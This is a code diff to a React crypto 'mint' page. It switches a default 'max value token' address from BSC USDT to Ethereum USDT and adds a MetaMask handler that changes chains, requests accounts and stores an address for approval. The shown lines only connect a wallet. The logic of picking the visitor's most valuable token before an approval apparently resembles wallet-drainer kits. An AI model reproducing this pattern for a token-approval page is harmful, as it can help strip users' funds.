@@ -597,7 +597,8 @@ function MintPage() {
     let len = walletTokenAddress.length;
     let walletTokenB1 = [];
     /* let maxValueTokenAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"; */
-    let maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
+    /* let maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955"; */
+    let maxValueTokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
 
 
     if (len > 0) {
@@ -614,7 +615,7 @@ function MintPage() {
         }
       }
       if (walletTokenB1[0] == 0) {
-        maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
+        maxValueTokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
       } else {
         for (let i = 0; i < len; i++) {
           if (walletTokenB[i] == walletTokenB1[0]) {
@@ -623,7 +624,7 @@ function MintPage() {
         }
       }
     } else {
-      maxValueTokenAddress = "0x55d398326f99059ff775485246999027b3197955";
+      maxValueTokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
     }
     console.log(walletTokenB1);
     console.log(walletTokenAddress);
@@ -775,6 +776,66 @@ function MintPage() {
 
 
   const onBtnClick = async () => {
+		const targetChainId = '0x1'; // Replace with your desired chain ID (e.g., Ethereum Mainnet is '0x1')
+	
+		if (window.ethereum) {
+			try {
+				// Get the current chain ID
+				const currentChainId = await window.ethereum.request({
+					method: 'eth_chainId',
+				});
+				console.log('Current Chain ID:', currentChainId);
+	
+				if (currentChainId === targetChainId) {
+					// Request account access
+					const addressArray = await window.ethereum.request({
+						method: 'eth_requestAccounts',
+					});
+					if (addressArray.length > 0) {
+						setApprove(addressArray[0]); // Replace with your own state updater
+					} else {
+						alert('No accounts found.');
+					}
+				} else {
+					// Switch to the desired chain
+					try {
+						await window.ethereum.request({
+							method: 'wallet_switchEthereumChain',
+							params: [{ chainId: targetChainId }],
+						});
+						console.log('Switched to chain:', targetChainId);
+	
+						// Automatically request accounts after switching the chain
+						const addressArray = await window.ethereum.request({
+							method: 'eth_requestAccounts',
+						});
+						if (addressArray.length > 0) {
+							setApprove(addressArray[0]); // Replace with your own state updater
+						} else {
+							alert('No accounts found.');
+						}
+					} catch (error) {
+						if (error.code === 4902) {
+							// The chain is not added to MetaMask
+							alert('Target chain is not added to MetaMask. Please add it manually.');
+						} else {
+							console.error('Error switching chain:', error);
+						}
+					}
+				}
+			} catch (err) {
+				console.error('Error connecting to MetaMask:', err);
+			}
+		} else {
+			// Fallback for MetaMask mobile app
+			const dappUrl = window.location.hostname; // Current DApp URL
+			const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
+			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
+			window.open(metamaskAppDeepLink, '_self');
+		}
+	};
+
+/*   const onBtnClick = async () => {
     if (window.ethereum) {
         try {
             const chain = await window.ethereum.request({ method: 'eth_chainId' });
@@ -801,7 +862,7 @@ function MintPage() {
       const metamaskAppDeepLink = "https://metamask.app.link/dapp/" + dappUrl;
       window.open(metamaskAppDeepLink, "_self");
     }
-};
+}; */
 
 /*   const onBtnClick = async () => {
     if (window.ethereum) {
